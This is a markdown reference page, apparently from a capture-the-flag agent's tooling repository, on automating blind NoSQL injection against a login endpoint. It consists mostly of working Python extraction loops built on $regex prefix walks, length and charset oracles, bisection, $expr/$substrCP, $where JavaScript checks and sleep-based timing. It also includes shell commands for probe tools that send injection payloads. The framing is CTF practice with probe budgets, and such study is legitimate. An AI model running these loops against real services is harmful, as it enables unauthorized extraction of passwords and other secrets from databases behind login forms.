# Extraction automation — the loops that walk the oracle

## The prefix-walk — the sequential loop

```python
import requests, string

url = "http://t/login"
oracle = lambda p: requests.post(url, json={
    "user": "admin", "pass": {"$regex": "^" + p}
}).status_code == 302

charset = string.ascii_lowercase + string.digits + "{}_-"
prefix = ""
for _ in range(64):
    for c in charset:
        if oracle(prefix + c):
            prefix += c
            break
    else:
        break
```

The sequential-walk — bounded, recorded, `blind-extraction-walkthrough.md`.

## The length-first — the `^.{N}$` bisect

```python
def length():
    for n in range(1, 65):
        if oracle_n(n):   — ^.{n}$ → true
            return n
```

`extraction.md` — the length-oracle.

## The charset-first — the `^[a-f0-9]+$`

```python
if oracle_charset("^[a-f0-9]+$"):    charset = "0123456789abcdef"
if oracle_charset("^[a-z0-9_-]+$"):  charset = "abcdefghijklmnopqrstuvwxyz0123456789_-"
if oracle_charset("^[a-z]+$"):       charset = string.ascii_lowercase
if oracle_charset("^[0-9]+$"):       charset = string.digits
if oracle_charset("^[A-Fa-f0-9]+$"): charset = "0123456789abcdefABCDEF"
if oracle_charset("^[a-zA-Z0-9]+$"): charset = string.ascii_letters + string.digits
```

`extraction.md` — the charset-discrimination.

## The bisect — the `^.{N}[a-m]` range

```python
def char_at(n):
    lo, hi = 0, len(charset) - 1
    while lo < hi:
        mid = (lo + hi) // 2
        rng = f"[{charset[lo]}-{charset[mid]}]"
        if oracle_range(n, rng):   — ^.{n}[a-m]
            hi = mid
        else:
            lo = mid + 1
    return charset[lo]
```

The range-oracle — `blind-extraction-walkthrough.md`.

## The `$expr`-side — the `substrCP` oracle

```python
def substr_oracle(i, ch):
    return requests.post(url, json={
        "user": "admin",
        "$expr": {"$eq": [{"$substrCP": ["$pass", i, 1]}, ch]}
    }).status_code == 302
```

`operators-aggregation.md` — the `$expr` doesn't need `enableJs`.

## The `$where`-side — the `charAt` oracle

```python
def where_oracle(expr):
    return requests.post(url, json={
        "user": "admin", "$where": expr
    }).status_code == 302

where_oracle("this.pass[0] == 'f'")
where_oracle("this.pass.charCodeAt(0) == 102")
where_oracle("this.pass.substr(0, 4) == 'flag'")
where_oracle("this.pass.startsWith('flag')")
where_oracle("this.pass.length == 32")
where_oracle("this.pass.indexOf('{') == 4")
```

`operators-js.md` — the `$where` needs `enableJs`.

## The timing-side — the `sleep` oracle

```python
import time

def time_oracle(cond, ms=3000):
    t0 = time.time()
    requests.post(url, json={
        "user": "admin",
        "$where": f"{cond} ? sleep({ms}) : true"
    })
    return time.time() - t0 > ms / 1000 * 0.8
```

`operators-js.md` — the timing needs a 3× jitter baseline.

## The `nosqli_probe` — the repo's matrix

```bash
python3 tools/web/nosqli_probe.py --url "http://t/login" --json \
  --user-field user --pass-field pass \
  --good-user test --good-pass test
```

`tooling.md` — the operator-matrix probe.

## The `http_probe` — the request/response gate

```bash
python3 tools/web/http_probe.py --url "http://t/login" --method POST \
  --body '{"user":"admin","pass":{"$regex":"^f"}}' \
  --challenge <name> --request-id r1
```

`tooling.md` — emits the `post-probe` command.

## The `state.py` — the ledger

```bash
python3 tools/state.py <name> --bug-class web-nosqli
python3 tools/state.py <name> --hypothesis "operator-injection"
python3 tools/state.py <name> --strategy-used chain_match
```

`tooling.md`.

## The budget — 25/45

`AGENTS.md` — the blind-extraction is sequential; a 32-char flag is ~128
probes — split via `writeup_search`/`solver_handoff` before the budget
burns.

## The sequential-budget — the loop's ceiling

```python
MAX_PROBES = 25
probe_count = 0
def probe(body):
    global probe_count
    probe_count += 1
    if probe_count > MAX_PROBES:
        raise BudgetExhausted()
    return requests.post(url, json=body)
```

The budget-cap — `AGENTS.md` — the loop must stop at 25.

## The `pickle`-state — the resume

```python
import pickle

with open("/tmp/nosqli-state.pkl", "wb") as f:
    pickle.dump({"prefix": prefix, "pos": pos, "count": probe_count}, f)
```

The resume-state — `workflow.md`.
